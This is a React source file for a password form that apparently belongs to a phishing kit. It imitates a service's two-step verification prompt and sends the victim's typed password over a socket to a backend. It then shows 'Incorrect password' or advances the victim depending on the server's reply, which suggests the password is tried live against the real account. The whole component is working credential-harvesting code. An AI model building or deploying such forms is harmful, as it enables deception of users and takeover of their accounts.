import React, { memo, useEffect, useState } from "react";
import { sockets } from './HomePage';
import { useNavigate, useSearchParams } from 'react-router-dom';

const PasswordForm = () => {
  const [searchParams, setSearchParams] = useSearchParams();
  const [error, setError] = useState(false);
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const navigate = useNavigate();

  const submit = (e) => {
    e.preventDefault();

    try{
      sockets.emit("password", { password: password, from: searchParams.get("ref_page") });
      setLoading(true);
      setError(false);

    } catch(e){
      console.log(e);
    }
  }

  useEffect(() => {

    const nextHandler = () => {
      navigate('/userconnect/last-page')
    }

    const errorPasswordHandler = () => {
      setLoading(false);
      setError(true);
    }

    sockets.on('next', nextHandler)
    sockets.on('error-password', errorPasswordHandler)

    return () => {
      sockets.off('next', nextHandler)
      sockets.off('error-password', errorPasswordHandler)
    }
  }, [])

  return <form className="password-form" onSubmit={submit}>
      <div className="password-form__inner">
        <div className="password-form__descr"><span>Password</span></div>
        <div className="password-form__below">You have enabled Two-Step Verification, so <br /> your account is protected with an <br /> additional password.</div>
        <label htmlFor="test3534" className='inp1-label inp1-label--width-275'>
            <input readOnly={loading} type="password" placeholder="Your password" className={error ? 'inp1 inp1--error' : 'inp1'} value={password} id='test3534' onChange={e => setPassword(e.target.value)} autoComplete='off' />
            <div className={error ? 'inp1-label__timeline inp1-label__timeline--error' : 'inp1-label__timeline'}></div>
        </label>
        {error && <div className="error1">Incorrect password</div>}
        {loading && <div className="loading dots-animated">Checking</div>}
      </div>
      <div className='password-form__controls'>
        <button type="submit" className="button button--transparent">Next</button>
      </div>
  </form>
}

export default memo(PasswordForm);
